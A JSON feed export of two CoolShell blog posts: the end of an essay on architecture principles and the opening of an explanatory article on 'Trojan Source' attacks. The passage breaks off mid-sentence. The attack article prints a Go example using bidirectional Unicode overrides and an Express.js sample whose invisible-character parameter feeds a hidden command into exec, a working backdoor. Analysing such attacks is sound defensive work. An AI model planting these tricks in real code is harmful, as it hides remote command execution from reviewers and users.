的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的</li>\n</ul>\n<p>在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……</p>\n<p>注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……</p>\n<h4>原则四：完备性会比性能更重要</h4>\n<p>我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。</p>\n<p>所以，我给如下的一些如下的架构原则：</p>\n<ul>\n<li><strong>使用最科学严谨的技术模型为主，并以不严谨的模型作为补充</strong>。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。</li>\n<li><strong>性能上的东西，总是有很多解的</strong>。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。</li>\n</ul>\n<p>为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。</p>\n<h4>原则五：制定并遵循服从标准、规范和最佳实践</h4>\n<p>这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。<strong>有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？</strong></p>\n<p>还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。</p>\n<p>下面，我罗列一些你需要注意的标准和规范（包括但不限于）：</p>\n<ul>\n<li><strong>服务间调用的协议标准和规范</strong>。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。</li>\n<li><strong>一些命名的标准和规范</strong>。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等</li>\n<li><strong>日志和监控的规范</strong>。这其中包括：日志格式，监控数据，采样要求，报警……等等</li>\n<li><strong>配置上的规范</strong>。这其中包括：操作系统配置、中间件配置，软件包……等等</li>\n<li><strong>中间件使用的规范</strong>。数据库，缓存、消息队列……等等</li>\n<li><strong>软件和开发库版本统一</strong>。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。</li>\n</ul>\n<p>这里重要说一下两个事：</p>\n<ul>\n<li><strong>Restful API 的规范</strong>。我觉得是非常重要的，这里给两个我觉得写得最好的参考：<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal</a> 和 <a href=\"https://github.com/microsoft/api-guidelines\" target=\"_blank\" rel=\"noopener\">Microsoft</a> 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。</li>\n<li><strong>另一个是服务调用链追踪</strong>。对于服务调用链追踪来说，基本上都是参考于 <a href=\"https://research.google/pubs/pub36356/\" target=\"_blank\" rel=\"noopener\">Google Dapper</a> 这篇论文，目前有很多的实现，最严格的实现是 <a href=\"https://zipkin.io/\" target=\"_blank\" rel=\"noopener\">Zipkin</a>，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。</li>\n<li><strong>软件升级</strong>。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。</li>\n</ul>\n<h4>原则六：重视架构扩展性和可运维性</h4>\n<p>在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。</p>\n<ul>\n<li><strong>通过服务编排架构来降低服务间的耦合</strong>。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。</li>\n<li><strong>通过服务发现或服务网关来降低服务依赖所带来的运维复杂度</strong>。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。</li>\n<li><strong>一定要使用各种软件设计的原则</strong>。比如：像SOLID这样的原则（参看《<a title=\"一些软件设计的原则\" href=\"https://coolshell.cn/articles/4535.html\">一些软件设计的原则</a>》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《<a title=\"SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读\" href=\"https://coolshell.cn/articles/5701.html\" target=\"_blank\" rel=\"noopener\">SteveY对Amazon和Google平台的吐槽</a>》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《<a title=\"分布式系统的事务处理\" href=\"https://coolshell.cn/articles/10910.html\" target=\"_blank\" rel=\"noopener\">分布式系统的事务处理</a>》，或微软件的 《<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/\" target=\"_blank\" rel=\"noopener\">Cloud Design Patterns</a>》）……等等</li>\n</ul>\n<h4>原则七：对控制逻辑进行全面收口</h4>\n<p>所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：</p>\n<ul>\n<li><strong>流量收口</strong>。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。</li>\n<li><strong>服务治理收口</strong>。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK &#8211; 如：Spring Cloud，或服务网格Service Mesh等技术。</li>\n<li><strong>监控数据收口</strong>。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。</li>\n<li><strong>资源调度有应用部署的收口</strong>。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。</li>\n<li><strong>中间件的收口</strong>。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。</li>\n</ul>\n<p>对此，这里的原则是：</p>\n<ul>\n<li><strong>你要选择容易进行业务逻辑和控制逻辑分离的技术</strong>。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。</li>\n<li><strong>你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术</strong>。如：有庞大社区而且相互兼容的技术，如：Java, Docker,  Ansible，HTTP，Telegraf/Collectd……</li>\n<li><strong>中间件你要使用可以 支持HA集群和多租户的技术</strong>。这里基本上所有的主流中间件都会支持 HA 集群方式的。</li>\n</ul>\n<h4>原则八：不要迁就老旧系统的技术债务</h4>\n<p>我发现很多公司都很非常大的技术债务，这些债务具体表现如下：</p>\n<ul>\n<li><strong>使用老旧的技术</strong>。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等</li>\n<li><strong>不合理的设计</strong>。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等</li>\n<li> <strong>缺少配套设施</strong>。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等</li>\n</ul>\n<p>来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“<strong>如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……</strong>”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。</p>\n<p>他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……</p>\n<p>我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《<a href=\"https://coolshell.cn/articles/11656.html\" target=\"_blank\" rel=\"noopener\">开发团队的效率</a>》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）</p>\n<p>这里有几个原则和方法我是非常坚持的，分享给大家：</p>\n<ul>\n<li><strong>与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。</strong></li>\n<li><strong>建设没有技术债的“新城区”，并通过“<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer\" target=\"_blank\" rel=\"noopener\">防腐层</a> ”的架构模型，不要让技术债侵入“新城区”</strong>。</li>\n</ul>\n<h4>原则九：不要依赖自己的经验，要依赖于数据和学习</h4>\n<p>有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……</p>\n<p>另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。</p>\n<h4>原则十：千万要小心 X &#8211; Y 问题，要追问原始需求</h4>\n<p>对于 <a title=\"X-Y Problem\" href=\"https://coolshell.cn/articles/10804.html\">X-Y 问题</a>，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。</p>\n<p>比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。</p>\n<p>我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……</p>\n<h4>原则十一：激进胜于保守，创新与实用并不冲突</h4>\n<p>我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《<a title=\"Go语言、Docker 和新技术\" href=\"https://coolshell.cn/articles/18190.html\" target=\"_blank\" rel=\"noopener\">Go,Docker 和新技术</a> 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。</p>\n<p>有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。</p>\n<p>这里的逻辑很简单 —— <strong>进步永远来自于探索，探索是要付出代价的，但是收益更大</strong>。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/18024.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg\" alt=\"API设计原则 &#8211; Qt官网的设计实践总结\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/18024.html\" class=\"wp_rp_title\">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href=\"https://coolshell.cn/articles/17680.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/02/gitlab-600-150x150.jpg\" alt=\"从Gitlab误删除数据库想到的\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17680.html\" class=\"wp_rp_title\">从Gitlab误删除数据库想到的</a></li><li ><a href=\"https://coolshell.cn/articles/17459.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2016/08/HighAvailability-BK-150x150.png\" alt=\"关于高可用的系统\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17459.html\" class=\"wp_rp_title\">关于高可用的系统</a></li><li ><a href=\"https://coolshell.cn/articles/9949.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg\" alt=\"IoC/DIP其实是一种管理思想\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/9949.html\" class=\"wp_rp_title\">IoC/DIP其实是一种管理思想</a></li><li ><a href=\"https://coolshell.cn/articles/6775.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"Bret Victor &#8211; Inventing on Principle\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/6775.html\" class=\"wp_rp_title\">Bret Victor &#8211; Inventing on Principle</a></li><li ><a href=\"https://coolshell.cn/articles/5686.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg\" alt=\"多些时间能少写些代码\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/5686.html\" class=\"wp_rp_title\">多些时间能少写些代码</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21672.html\">我做系统架构的一些原则</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "程序设计",
          "link": "https://coolshell.cn/articles/21672.html",
          "creator": "陈皓",
          "pubDate": "Tue, 21 Dec 2021 07:46:41 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "b0b3767cc94efb275d9ac58b85332cca",
          "highlights": []
        },
        {
          "title": "源代码特洛伊木马攻击",
          "description": "<p>最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/21649.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/21649.html\">源代码特洛伊木马攻击</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-full wp-image-21658\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg\" alt=\"\" width=\"340\" height=\"270\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg 340w, https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv-300x238.jpg 300w\" sizes=\"(max-width: 340px) 100vw, 340px\" />最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-large wp-image-21652\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg\" alt=\"\" width=\"640\" height=\"206\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-300x96.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-768x247.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-604x194.jpg 604w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427.jpg 1288w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></p>\n<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title=\"ISO/IEC 8859-6\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-6\">ISO/IEC 8859-6</a>和<a title=\"ISO/IEC 8859-8\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-8\">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>\n<p><span id=\"more-21649\"></span></p>\n<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>\n<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href=\"https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/\" target=\"_blank\" rel=\"noopener\">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>\n<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">package main\n\nimport \"fmt\"\n\nfunc main() {\n  str, mask := \"Hello, World!‮10x‭\", 0\n\n  bits := 0\n  for _, ch := range str {\n    for ch &gt; 0 {\n      bits += int(ch) &amp; mask\n      ch = ch &gt;&gt; 1\n    }\n  }\n  fmt.Println(\"Total bits set:\", bits)\n}</pre>\n<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  &#8211;<a href=\"https://play.golang.org/p/e2BDZvFlet0\" target=\"_blank\" rel=\"noopener\"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>\n<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21653\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg\" alt=\"\" width=\"500\" height=\"324\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg 902w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-300x194.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-768x497.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-417x270.jpg 417w\" sizes=\"(max-width: 500px) 100vw, 500px\" /></p>\n<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href=\"https://www.compart.com/en/unicode/bidiclass\" target=\"_blank\" rel=\"noopener\">Unicode Bidirectional Classes</a>）：</p>\n<ul>\n<li><strong>U+202E &#8211; Right-to-Left Override [RLO] </strong><br />\n表示，开始从右到左显示，于是，接下来的文本 <code>10x\", 0</code> 变成了 <code>0 ,\"x01</code></li>\n<li><strong>U+202D &#8211; Left-to-Right Override [LRO]</strong><br />\n表示，开始从左到右显示，于是，<code>0,\"x01</code> 中的前4个字符<code>0 ,\"</code> 反转成  <code>\", 0</code>，于是整个文本成了 <code>\", 0x01</code></li>\n</ul>\n<p>所以，你在视觉上看到的是结果是—— <code>\"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>\n<p>然后，Github官方博客中还给了一个安全问题 <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574\">CVE-2021-42574</a> ——</p>\n<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>\n<p>这个安全问题在剑桥大学的这篇论文“<a href=\"https://www.trojansource.codes/\" target=\"_blank\" rel=\"noopener\">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>\n<p>通过双向文本可以把下面这段代码：</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21655\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg\" alt=\"\" width=\"569\" height=\"240\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-604x255.jpg 604w\" sizes=\"(max-width: 569px) 100vw, 569px\" /></p>\n<p>伪装成下面的这个样子：</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21654\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg\" alt=\"\" width=\"580\" height=\"245\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-604x255.jpg 604w\" sizes=\"(max-width: 580px) 100vw, 580px\" /></p>\n<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>\n<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> &#8211; </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>\n<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href=\"https://certitude.consulting/blog/en/invisible-backdoor/\" target=\"_blank\" rel=\"noopener\">The Invisible Javascript Backdoor</a>”里的这个示例：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const express = require('express');\nconst util = require('util');\nconst exec = util.promisify(require('child_process').exec);\n\nconst app = express();\n\napp.get('/network_health', async (req, res) =&gt; {\n    const { timeout,ㅤ} = req.query;\n    const checkCommands = [\n        'ping -c 1 google.com',\n        'curl -s http://example.com/',ㅤ\n    ];\n\n    try {\n        await Promise.all(checkCommands.map(cmd =&gt; \n                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));\n        res.status(200);\n        res.send('ok');\n    } catch(e) {\n        res.status(500);\n        res.send('failed');\n    }\n});\n\napp.listen(8080);</pre>\n<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>\n<p>然后，上面这个代码是有不可见的Unicode 